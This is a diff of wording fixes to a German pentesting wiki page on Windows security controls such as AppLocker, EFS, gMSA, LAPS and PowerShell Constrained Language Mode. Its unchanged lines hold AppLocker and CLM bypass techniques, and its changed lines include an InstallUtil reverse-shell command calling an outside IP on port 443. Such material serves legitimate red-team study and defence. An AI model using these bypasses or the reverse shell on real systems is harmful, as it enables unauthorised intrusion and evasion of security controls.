@@ -20,7 +20,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Dieser Registrypfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, die aktuelle Regelmenge zu überprüfen, die auf dem System durchgesetzt wird:
+Dieser Registrierungspfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, die aktuelle Regelmenge zu überprüfen, die auf dem System durchgesetzt wird:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
@@ -36,7 +36,7 @@ C:\windows\tracing
 - Häufig **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binärdateien können ebenfalls nützlich sein, um AppLocker zu umgehen.
 - **Schlecht geschriebene Regeln könnten ebenfalls umgangen werden**
 - Zum Beispiel, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, können Sie einen **Ordner namens `allowed`** überall erstellen und er wird erlaubt.
-- Organisationen konzentrieren sich oft darauf, die **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** ausführbare Datei zu **blockieren**, vergessen jedoch die **anderen** [**PowerShell ausführbaren Standorte**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie **`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`** oder **`PowerShell_ISE.exe`**.
+- Organisationen konzentrieren sich oft darauf, die **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** ausführbare Datei zu **blockieren**, vergessen jedoch die **anderen** [**PowerShell ausführbaren Standorte**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
 - **DLL-Durchsetzung sehr selten aktiviert** aufgrund der zusätzlichen Belastung, die sie auf ein System ausüben kann, und der Menge an Tests, die erforderlich sind, um sicherzustellen, dass nichts kaputt geht. Daher wird die Verwendung von **DLLs als Hintertüren helfen, AppLocker zu umgehen**.
 - Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Für weitere Informationen siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
@@ -92,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Um es aufzulisten, könnten Sie auch ausführen:
+Um es aufzulisten, könnten Sie auch Folgendes ausführen:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -103,7 +103,7 @@ sc query windefend
 ```
 ## Encrypted File System (EFS)
 
-EFS sichert Dateien durch Verschlüsselung, indem ein **symmetrischer Schlüssel** verwendet wird, der als **Dateiverschlüsselungsschlüssel (FEK)** bekannt ist. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im $EFS **alternativen Datenstrom** der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Strom zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS sichert Dateien durch Verschlüsselung, indem es einen **symmetrischen Schlüssel** verwendet, der als **Dateiverschlüsselungsschlüssel (FEK)** bekannt ist. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im $EFS **alternativen Datenstrom** der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Strom zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
 **Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:
 
@@ -123,7 +123,7 @@ Diese Verschlüsselungsmethode ermöglicht **transparenten Zugriff** auf verschl
 
 Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** genutzt hat, indem Sie überprüfen, ob dieser Pfad existiert: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Überprüfen Sie, **wer** Zugriff auf die Datei hat, indem Sie cipher /c \<file>\ verwenden.\
+Überprüfen Sie, **wer** Zugriff auf die Datei hat, indem Sie cipher /c \<file>\
 Sie können auch `cipher /e` und `cipher /d` in einem Ordner verwenden, um alle Dateien zu **verschlüsseln** und **zu entschlüsseln**.
 
 ### Entschlüsseln von EFS-Dateien
@@ -140,7 +140,7 @@ Dieser Weg erfordert, dass der **Opferbenutzer** einen **Prozess** im Host **aus
 
 Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu traditionellen Dienstkonten, die oft die Einstellung "**Passwort läuft niemals ab**" aktiviert haben, bieten gMSAs eine sicherere und verwaltbare Lösung:
 
-- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes, 240-Zeichen-Passwort, das automatisch gemäß der Domänen- oder Computerpolitik geändert wird. Dieser Prozess wird vom Key Distribution Service (KDC) von Microsoft verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
+- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes, 240 Zeichen langes Passwort, das automatisch gemäß der Domänen- oder Computerpolitik geändert wird. Dieser Prozess wird vom Key Distribution Service (KDC) von Microsoft verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
 - **Erhöhte Sicherheit**: Diese Konten sind immun gegen Sperrungen und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
 - **Unterstützung mehrerer Hosts**: gMSAs können über mehrere Hosts hinweg geteilt werden, was sie ideal für Dienste macht, die auf mehreren Servern ausgeführt werden.
 - **Fähigkeit zu geplanten Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs das Ausführen geplanter Aufgaben.
@@ -160,7 +160,7 @@ Sie können dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvaz
 
 ## LAPS
 
-Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) heruntergeladen werden kann, ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig**, einzigartig und **regelmäßig geändert** sind, werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird die Möglichkeit geboten, lokale Administratorpasswörter zu lesen.
+Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) heruntergeladen werden kann, ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **randomisiert**, einzigartig und **regelmäßig geändert** sind, werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird die Möglichkeit geboten, lokale Admin-Passwörter zu lesen.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -168,7 +168,7 @@ Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https:
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die benötigt werden, um PowerShell effektiv zu nutzen, wie das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierter Workflows, PowerShell-Klassen und mehr.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die benötigt werden, um PowerShell effektiv zu nutzen, wie das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.
 
 ### **Überprüfen**
 ```powershell
@@ -187,7 +187,7 @@ In der aktuellen Windows-Version funktioniert dieser Bypass nicht, aber Sie kön
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Reverse shell:
+#### Reverse-Shell:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -240,7 +240,7 @@ Die SSPI ist dafür verantwortlich, das geeignete Protokoll für zwei Maschinen 
 
 ## UAC - Benutzerkontensteuerung
 
-[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungseingabeaufforderung für erhöhte Aktivitäten** ermöglicht.
+[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht.
 
 {{#ref}}
 uac-user-account-control.md
